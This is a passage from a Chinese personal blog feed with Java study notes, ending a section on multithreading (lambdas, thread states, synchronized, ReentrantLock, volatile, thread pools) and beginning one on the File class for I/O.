<p>比如上面方法传入的 Runnable 实现类就是一个匿名类，传入 Thread 的构造方法之后创建线程，再用实例 Xorex 的 start() 方法启动线程。</p>
<h4 id="方法三：使用-Lambda-表达式"><a href="#方法三：使用-Lambda-表达式" class="headerlink" title="方法三：使用 Lambda 表达式"></a>方法三：使用 Lambda 表达式</h4><p>其实方法三和上面的方法二本质上是一样，唯一的不同就是使用了 Java8 新加入的 Lambda 表达式简化了代码。</p>
<p>首先忽略 λ Lambda 这个奇奇怪怪的名字，这个代码简化其实贼简单，就是个<strong>实例化匿名类</strong>的语法糖，它可以将所有能够逻辑推断出来的东西全部省略，但只有一个限制，就是这个类里面<strong>只能有一个方法</strong>，下面是使用 Lambda 表达式简化的线程建立：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Thread Xorex=<span class="keyword">new</span> Thread(()-&gt; System.out.println(<span class="string">&quot;This is an another thread&quot;</span>)); <span class="comment">//</span></span><br><span class="line">        Xorex.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面就是最简状态的实例化匿名类的代码，少了 <code>new Runnable()</code> 因为编译器可以通过 Thread 构造方法接收 Runnable 接口对象来推断出来这个类实现了 Runnable 接口。少了重写方法的签名 <code>public void run()</code> 是因为这个接口只有一个抽象方法等待重写，肯定是它。少了<code>&#123;;&#125;</code> 大括号和分号是因为里面只有一句语句，当然如果有多语句的话，还是需要 <code>&#123;&#125;</code> 来确定语句范围，需要 <code>;</code> 来将多个语句分隔开来。至于剩下的 Lambda 表达式标志 <code>() -&gt;</code> 其中 <code>()</code> 表示是一个方法，里面用来填写参数（可省略类型，因为可以根据抽象方法推断出来），没有参数就空着。而 <code>-&gt;</code> 则是 Lambda 的根本标志符号，必不可少。</p>
<p>如果需要返回参数呢，有两种方式，一种是单表达式语句，这种就按照最简写即可，而会自动返回表达式计算的结果，如果是多语句，则需要自己写 return 返回值。</p>
<p>下面是对 Lambda 表达式的三种情况总结：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">( params ) -&gt; expression</span><br><span class="line">( params ) -&gt; statement</span><br><span class="line">( params ) -&gt; &#123; statements &#125;</span><br></pre></td></tr></table></figure>
<p>第一种举个例子：<code>(int e) -&gt; e*e</code> 因为是一个 expression 直接返回这个表达式计算值。</p>
<p>第二种举个例子：<code>(int e) -&gt; e=e*e</code> 是一个单语句 statement 则返回空 void 。</p>
<p>第三种举个例子：只要有大括号，就必须手写 return 语句。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">int</span> e) -&gt; &#123;<span class="keyword">return</span> e*e;&#125;</span><br><span class="line">(<span class="keyword">int</span> e) -&gt; &#123;</span><br><span class="line">    <span class="keyword">int</span> e2=e*e;</span><br><span class="line">    <span class="keyword">return</span> e2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Lambda 表达式里面的各种特性还有很多，以后遇到了会好好总结一下的！</p>
<h3 id="Thread-类"><a href="#Thread-类" class="headerlink" title="Thread 类"></a>Thread 类</h3><p>上面只是利用 Thread 类新建了一个线程，而 Thread 类中还有很多好用的方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Thread</span><span class="params">(String name)</span></span>; <span class="comment">//构造方法，设置线程名称</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>; <span class="comment">//设置线程名称</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Thread</span><span class="params">(Runnable target)</span></span>; <span class="comment">//构造方法，设置线程运行代码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setPriority</span><span class="params">(<span class="keyword">int</span> newPriority)</span></span>; <span class="comment">//设置线程优先级，1-10，默认5</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>; <span class="comment">//运行此进程，并执行run()方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">(<span class="keyword">long</span> millis)</span> <span class="comment">//静态方法，正在执行的线程以毫秒数暂停</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Thread <span class="title">currentThread</span><span class="params">()</span> <span class="comment">//返回对当前正在执行的线程对象的引用</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>首先对于 <code>setPriority</code> 方法并不能保真正优先执行此线程，而是增加了此线程被执行的概率，总体来说被执行次数会高于优先级低的线程。</li>
<li>其次是 <code>sleep</code> 方法是一个静态方法，在被当前线程执行的时候，当前线程就会暂停执行对应毫秒，因为此方法被执行肯定是在某个线程中被执行的，所以暂停的线程也肯定是它所在的线程。</li>
<li>最后 <code>currentThread</code>  方法会返回当前执行的线程对象的引用，需要用 Thread 来接收，本质上和正在运行的线程是一个实例。</li>
</ul>
<h2 id="线程状态"><a href="#线程状态" class="headerlink" title="线程状态"></a>线程状态</h2><p>对于一个线程来说，它也有自己的声明周期，在 Java 中，一个线程的声明周期有以下几种：</p>
<ul>
<li><code>New</code> 新建状态：线程处于正在被生成的过程。</li>
<li><code>Runnable</code> 就绪状态：线程处于可以被执行状态。</li>
<li><code>Timeed Waiting</code> 等待时间状态：线程处于基于时间的等待状态。</li>
<li><code>Waiting</code> 等待状态：线程处于等待唤醒状态。</li>
<li><code>Blocked</code> 阻塞状态：线程处于无法被执行状态。</li>
<li><code>Terminated</code> 死亡状态：线程处于被终止的状态。</li>
</ul>
<p><img src="https://xorex.space/image/157.jpg" alt="preview"></p>
<h3 id="Runnable-状态"><a href="#Runnable-状态" class="headerlink" title="Runnable 状态"></a>Runnable 状态</h3><p>其实 Runnable 是两种子状态的一个概括，总的来说是可被执行状态分为就绪状态和被执行状态，也就是上图对应的 Ready 和 Running 状态。</p>
<p>我们不需要关心程序处于 Runnable 的时候，具体是在等待 CPU 调度还是正在 CPU 上运行，因为这是我们无法控制的，分配计算资源完全是操作系统干的，作为上层的应用程序我们无法干涉，所以就统称为 Runnable 可运行状态。</p>
<h3 id="Waiting-和-Timed-Waiting-状态"><a href="#Waiting-和-Timed-Waiting-状态" class="headerlink" title="Waiting 和 Timed Waiting 状态"></a>Waiting 和 Timed Waiting 状态</h3><p>这两个状态基本相同，都是主动的放弃 CPU 被执行权，主动进入了等待状态。不同的是，Waiting 是无限期等待，需要被另外一个线程唤醒才能进入 Runnable 状态，而 Timed  Waiting 是主动放弃我们设定的一定时间的 CPU 被执行权，过了这段时间，它会自己醒来，进入 Runnable 状态。</p>
<h3 id="Blocked-状态"><a href="#Blocked-状态" class="headerlink" title="Blocked 状态"></a>Blocked 状态</h3><p>这个状态被称为阻塞状态，无法进入 Runnable 并不是因为主动放弃，而是无法获得执行权，或者说此线程被锁上了并且钥匙不在自己的手上。一旦此线程拿到钥匙，就会解锁进入 Runnable 状态。</p>
<h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><h3 id="出现原因"><a href="#出现原因" class="headerlink" title="出现原因"></a>出现原因</h3><p>多线程虽然很棒，不仅仅能通过 CPU 的快速切换实现“同时”执行多个连续任务，还能利用 CPU 本身硬件支持的多核多线程来真正同时执行多个线程，大幅度提高计算效率。比如 R5 4500U 就拥有六个核心，对于一个任务开六个线程可以让这六个核心同时去处理它，从而获得六倍的运行速度。</p>
<p>但是要知道对于处理器在运行语句的时候，不知道快速切换或者多核心实际运行位置所在之处。当多个线程需要同时对统一数据进行写入的时候，就会导致线程安全的问题。硬核一点，看一个语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">n=n+<span class="number">1</span>;</span><br><span class="line"><span class="comment">//对应了下面三个指令：</span></span><br><span class="line">ILOAD</span><br><span class="line">IADD</span><br><span class="line">ISTORE</span><br></pre></td></tr></table></figure>
<p>如果有两个线程同时对 n 变量进行上述语句的运行，因为不知道啥时候就丧失了 CPU 运行权，由另外一个线程运行，所以就可能出现下面的运行情况，在 Thread1 执行完 ILOAD 指令之后，丧失 CPU 执行权，由 Thread2 执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌───────┐    ┌───────┐</span><br><span class="line">│Thread1│    │Thread2│</span><br><span class="line">└───┬───┘    └───┬───┘</span><br><span class="line">    │            │</span><br><span class="line">    │ILOAD (100) │</span><br><span class="line">    │            │ILOAD (100)</span><br><span class="line">    │            │IADD</span><br><span class="line">    │            │ISTORE (101)</span><br><span class="line">    │IADD        │</span><br><span class="line">    │ISTORE (101)│</span><br><span class="line">    ▼            ▼</span><br></pre></td></tr></table></figure>
<p>两个线程两次执行 <code>n=n+1</code> ，但是 n 的值只加了 1 ，这就是因为线程在读取写入数据的不同步导致的，这可是个大问题。我们再看一个代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        Runnable RunCode=()-&gt;&#123;</span><br><span class="line">            <span class="keyword">while</span>(Tempest.count!=<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Tempest.count--;</span><br><span class="line">                System.out.println(Tempest.count);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        Thread Th1=<span class="keyword">new</span> Thread(RunCode);</span><br><span class="line">        Thread Th2=<span class="keyword">new</span> Thread(RunCode);</span><br><span class="line"></span><br><span class="line">        Th1.start();</span><br><span class="line">        Th2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> count=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面代码在同时执行  Th1 和 Th2 两个线程的时候，都会对同一个数据 count 进行读写操作，因为线程执行权切换可能发生在 count– 和输出 count 之间发生，所以看输出结果就会发现顺序是乱的，这就是因为线程代码不同步造成的，</p>
<p>线程同步，也就是一个线程中，某个过程应该连续同步完成，不允许中断。而实现线程同步，就需要将同步代码上锁，保证只有一个线程有钥匙打开并执行它，其它线程无法打开执行。</p>
<h3 id="1-同步代码块"><a href="#1-同步代码块" class="headerlink" title="1. 同步代码块"></a>1. 同步代码块</h3><p>一种是使用同步代码块这种语法将需要同步执行的一些代码框到里面，然后加上一个锁，只有拿到钥匙才能执行里面的内容，只需要保证钥匙的唯一性，就可以保证在同一时间，因为只有一个线程拥有钥匙，所以只有一个线程会执行锁里面的代码。当里面代码执行完毕之后，会将钥匙随机传给下一个线程，这个线程打开自己的锁，执行锁里面的代码。在这里，锁就是 <code>synchronized</code> 关键词，它锁住了代码块里面的代码，钥匙就是参数 <code>key</code> ，它需要是一个唯一的实例，用来解锁并执行内部代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(Object key) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举个例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        Runnable RunCode=()-&gt;&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(<span class="string">&quot;Xorex&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(Tempest.count!=<span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    Tempest.count--;</span><br><span class="line">                    System.out.println(Tempest.count);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Thread Th1=<span class="keyword">new</span> Thread(RunCode);</span><br><span class="line">        Thread Th2=<span class="keyword">new</span> Thread(RunCode);</span><br><span class="line"></span><br><span class="line">        Th1.start();</span><br><span class="line">        Th2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> count=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面就将同步代码使用 <code>synchronized</code> 语句上锁，然后设置字符串实例 <code>&quot;Xorex&quot;</code> 作为钥匙。在代码执行的时候，只有拥有钥匙的线程才能打开锁执行代码，锁代码执行完毕之后，会释放钥匙，释放的钥匙会随机传给下一个线程，注意可能会出现自己传给自己的情况，毕竟是随机传。</p>
<h3 id="2-同步方法"><a href="#2-同步方法" class="headerlink" title="2. 同步方法"></a>2. 同步方法</h3><p>同步方法和同步代码块的使用原理是一模一样的，但是不同的是这里将 <code>synchronized</code> 修饰词词用于某个方法的签名，这样在调用这个方法的时候，默认为这个方法里面的代码上了锁，只有此线程有钥匙才能解锁执行，比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">Eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Tempest.count--;</span><br><span class="line">    System.out.println(<span class="string">&quot;The rest count:&quot;</span>Tempest.count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为不能传 key 参数，所以这里面的钥匙是不能自定义的，是固定的。</p>
<p>对于像上面一样的普通方法，key 为拥有此方法的实例 <code>this</code> 。</p>
<p>而对于静态方法，因为和实例无关，只和类有关，所以 key 为此类的 Class 实例。</p>
<h3 id="3-同步锁-Lock"><a href="#3-同步锁-Lock" class="headerlink" title="3. 同步锁 Lock"></a>3. 同步锁 Lock</h3><p>同步锁是一个接口，它的作用和 <code>synchronized</code> 有一样的地方，但是 Lock 的功能更强大，至于强大的功能以后再说，先看 Lock 接口的内容。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span></span>; <span class="comment">//开始获取锁，如果其他线程已经占用，则等待</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">tryLock</span><span class="params">()</span></span>; <span class="comment">//尝试获取锁，如果成功返回 true，如果锁被占用返回 false 并等待锁。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span></span>; <span class="comment">//解锁</span></span><br></pre></td></tr></table></figure>
<p>大概就先了解这几个就可以了，需要注意的是这个是不会自动返还锁的，所以一旦在获取锁之后的代码里面，遇到了异常，就会中断代码，后面的释放锁操作就无法执行，所以在使用 Lock 的时候，需要配合这 try-catch 语句，将 unlock() 放到 finally 里面。</p>
<p>实现 Lock 接口的唯一类为：<code>ReentrantLock</code>，使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.Lock;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Lock lock=<span class="keyword">new</span> ReentrantLock();</span><br><span class="line">    </span><br><span class="line">        Runnable RunCode=()-&gt;&#123;</span><br><span class="line">            <span class="keyword">while</span>(Tempest.count&gt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                lock.lock();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(Tempest.count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                        Tempest.count--;</span><br><span class="line">                        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;  &quot;</span>+Tempest.count);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    lock.unlock();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Thread Th1=<span class="keyword">new</span> Thread(RunCode,<span class="string">&quot;Thread01&quot;</span>);</span><br><span class="line">        Thread Th2=<span class="keyword">new</span> Thread(RunCode,<span class="string">&quot;Thread02&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Th1.start();</span><br><span class="line">        Th2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> count=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="可重入锁"><a href="#可重入锁" class="headerlink" title="可重入锁"></a>可重入锁</h3><p>在 <code>synchronized</code> 同步代码块或者同步方法的地方，只要这个线程获取了唯一的钥匙，那么遇到相同的锁，都可以打开，比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(<span class="string">&quot;Xorex&quot;</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="string">&quot;Xorex&quot;</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样的代码，最内层的代码一定是可以执行的，因为两个锁的钥匙相同，只要获取了第一个锁的钥匙 <code>&quot;Xorex&quot;</code>  String 实例，那么第二个锁也因为有了钥匙可以打开。这样的锁叫作可重入锁。</p>
<h3 id="产生死锁"><a href="#产生死锁" class="headerlink" title="产生死锁"></a>产生死锁</h3><p>死锁是因为两个线程在等待钥匙的时候，资源获取进入僵局，使得无法结束等待的情况称为死锁。</p>
<p>比如：两个线程，分别持有钥匙1和钥匙2，有钥匙1的同时在请求钥匙2，有钥匙2的同时在请求钥匙1。两个线程都进入了等待钥匙的状态，而自己持有的钥匙无法释放，导致了对方也陷入僵局。</p>
<p>一旦出现了死锁，只能停止执行代码，所以一定要尽力避免出现死锁的情况。</p>
<h2 id="变量的多线程安全"><a href="#变量的多线程安全" class="headerlink" title="变量的多线程安全"></a>变量的多线程安全</h2><p>对于多个线程对同一个变量进行操作的时候，因为 CPU 缓存的原因，变量经过更改之后是放在缓存中的，从缓存写入到内存的时间是不确定的。所以可能一个线程更改了数据之后，另外一个线程从内存中读取的还是旧的信息。为了保证涉及到多线程的数据的安全，可以在声明变量的时候添加关键词 volatile 不稳定的。标志完之后，所有对此数据的修改都会立刻写入内存中，保证其他线程的读取正确。</p>
<h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><h3 id="普通线程池"><a href="#普通线程池" class="headerlink" title="普通线程池"></a>普通线程池</h3><p>线程池就是线程的集合体，通过将线程保存在线程池中来反复利用已经有的线程。因为单独的一个线程的新建和销毁都需要消耗很多资源，所以这样将线程集合在一起，需要了就给他分配任务执行的方式能很好的管理线程。</p>
<p>新建线程池是通过 Executors 类的三个静态方法来返回一个 ExecutorService 接口的实现实例，一共有三种线程池：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">newFixedThreadPool(<span class="keyword">int</span> nThreads) <span class="comment">// 固定数量线程池需要输入参数线程数量</span></span><br><span class="line">newCachedThreadPool() <span class="comment">// 可变数量线程池，会自己根据任务调整</span></span><br><span class="line">newSingleThreadExecutor() <span class="comment">// 单线程线程执行器</span></span><br></pre></td></tr></table></figure>
<p>通过静态方法得到一个 ExecutorService 接口实现类的实例之后，调用 submit(Runnable) 并传入一个 Runnable 实现实例之后线程会自动运行。</p>
<p>最后需要调用线程池的方法 shutdown() 来关闭线程池，不然 Java 程序不会结束运行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ExecutorService Xorex=Executors.newSingleThreadScheduledExecutor();</span><br><span class="line">        Runnable task=() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    <span class="comment">//<span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;:&quot;</span>+i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Xorex.submit(task);</span><br><span class="line">        Xorex.submit(task);</span><br><span class="line">        Xorex.submit(task);</span><br><span class="line">        Xorex.submit(task);</span><br><span class="line"></span><br><span class="line">        Xorex.shutdown();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="反复线程池"><a href="#反复线程池" class="headerlink" title="反复线程池"></a>反复线程池</h3><p>当线程任务需要不断地重复执行的时候，就需要反复线程池了，接口为 ScheduledExecutorService ，而获取线程池的实例还是依靠 Executors 类的静态方法，不过这里只需要找名字里带有 Scheduled 的即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ScheduledExecutorService Xorex=Executors.newScheduledThreadPool(<span class="number">12</span>);</span><br></pre></td></tr></table></figure>
<p>拿到了一个反复线程池之后，自然要分配任务并且设定反复执行的时间之类的参数。这里 ScheduledExecutorService 接口启动线程方法变成了好几个，对应不同的反复模式：</p>
<p>延迟执行设定，delayTime 之后开始运行，执行 Runnable。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">schedule(Runnable,<span class="keyword">int</span> delayTime, TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure>
<p>固定速率执行设定，delayTime 之后开始运行，每次执行完任务每隔 RepeatDelayTime 之后再次重复执行任务。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">scheduleAtFixedRate(Runnable,<span class="keyword">int</span> delayTime,<span class="keyword">int</span> RepeatDelayTime, TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure>
<p>固定时间执行设定，delayTime 之后开始运行，每隔 RepeatStartTime 重启线程任务，不管此线程是否执行完任务，都会重启线程，重新执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ses.scheduleWithFixedDelay(Runnable,<span class="keyword">int</span> delayTime,<span class="keyword">int</span> RepeatStartTime, TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure>
<iframe src="https://www.xmind.net/embed/uW3Rg8" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>思维导图</tag>
        <tag>笔记</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>Java输入输出流学习笔记</title>
    <url>/2021/02/21/6b113700fd3d/</url>
    <content><![CDATA[<h2 id="文件-File-类"><a href="#文件-File-类" class="headerlink" title="文件 File 类"></a>文件 File 类</h2><h3 id="创建-File-实例"><a href="#创建-File-实例" class="headerlink" title="创建 File 实例"></a>创建 File 实例</h3><p>首先在进行输入输出处理之前，我们来看看数据的载体——文件。</p>
<p>因为我们在内存中存储的数据都是暂时的，一旦断电，都会消失，所以通常我们会把数据以文件的形式存储到永久存储的硬盘中，可以说，数据的操作单位就是文件。而 Java 中的 File 类就是专门对文件进行概括的一个类，它能很好的控制一个类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File file=<span class="keyword">new</span> File(<span class="string">&quot;Xorex.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>上面我们通过给构造方法传入一个文件的路径，成功实例化了 File 类。这个实例就是 <code>Xorex.txt</code> 这个文件，上面我们传入了 <code>Xorex.txt</code>  这个文件的相对路径，可以唯一确定这个文件，当然绝对路径也是可以的：<code>E:\\Java\\Xorex.txt</code> 。</p>
<p>需要注意的是，在不同的操作系统中，路径的表示是不同的，Windows 里面使用 <code>\</code> 表示路径分隔符，而 Linux 里面使用 <code>/</code> 表示路径分隔符。又因为在字符串中 <code>\</code> 表示转义，所以在写绝对路径或者相对路径的时候，需要用 <code>\\</code> 来分隔路径。</p>
<h3 id="得到文件路径"><a href="#得到文件路径" class="headerlink" title="得到文件路径"></a>得到文件路径</h3><p>得到文件路径中，File 类里面有三种不同的方法，分别是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getPath(); <span class="comment">// 返回构造方法传入的的路径</span></span><br><span class="line">getAbsolutePath(); <span class="comment">// 若构造方法为相对路径，则和当前路径拼接成绝对路径之后返回。若为绝对路径，则直接返回构造方法传入的绝对路径。</span></span><br><span class="line">getCanonicalPath(); <span class="comment">// 返回标准的绝对路径，会将 .// ..// 这些转化。</span></span><br></pre></td></tr></table></figure>
<h3 id="获取-File-实例的信息"><a href="#获取-File-实例的信息" class="headerlink" title="获取 File 实例的信息"></a>获取 File 实例的信息</h3><p>对于一个通过路径得到的 File 实例，如果路径结尾是一个文件名，那么 File 实例就是这个文件，如果是一个文件夹的名字，那么 File 实例就是这个文件夹。两者都可以被 File 类表示。</p>
<p>对于确定了一个文件/文件夹的 File 实例，我们可以通过方法获取一些这个文件/文件夹的信息。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isFile</span><span class="params">()</span> 是否为文件</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isDirectory</span><span class="params">()</span> 是否为文件夹</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">canRead</span><span class="params">()</span> 是否可读</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">canWrite</span><span class="params">()</span> 是否可写</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">canExecute</span><span class="params">()</span> 是否可执行/可列出来（可执行指 JVM 是否有权限读取、修改它）</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">length</span><span class="params">()</span> 文件大小</span></span><br></pre></td></tr></table></figure>
<p>如果确定了这个实例是一个文件夹，那么还可以使用下面的方法来获取文件夹里面的东西。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] list() <span class="comment">// 以字符串列出所有内容 </span></span><br><span class="line">String[] list(FileNameFilter) <span class="comment">// 传入 FilenameFilter 接口的实例过滤列出内容</span></span><br><span class="line">File[] listFiles() <span class="comment">// 以 File 文件列出所有内容 </span></span><br><span class="line">File[] listFiles(FileFilter) <span class="comment">// 传入 FileFilter 接口的实例过滤列出内容</span></span><br><span class="line">File[] listFiles(FileNameFilter) <span class="comment">// 传入 FilenameFilter 接口的实例过滤列出内容</span></span><br></pre></td></tr></table></figure>
<h3 id="操作文件"><a href="#操作文件" class="headerlink" title="操作文件"></a>操作文件</h3><p>如果我们给的路径源文件不存在，可以直接创建，如果存在了，可以直接删除：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">createNewFile</span><span class="params">()</span> <span class="comment">// 文件路径的所有文件夹必须全部都存在才能创建成功</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">delete</span><span class="params">()</span> <span class="comment">// 删除文件</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">deleteOnExit</span><span class="params">()</span> <span class="comment">// JVM 结束运行时删除此文件</span></span></span><br></pre></td></tr></table></figure>
<p>我们还可以用 File 的静态方法创建一个临时文件，这个临时文件默认保存在 C 盘用户文件夹下面等等等的一个叫作 Temp 的文件夹。我们可以自定义这个临时文件的前缀和后缀，甚至是保存地点，这个临时文件的名字会在前缀和后缀之间加上一串随机数，且不会自动删除，所以最好获得临时文件的实例之后直接调用 <code>deleteOnExit()</code> 。</p>
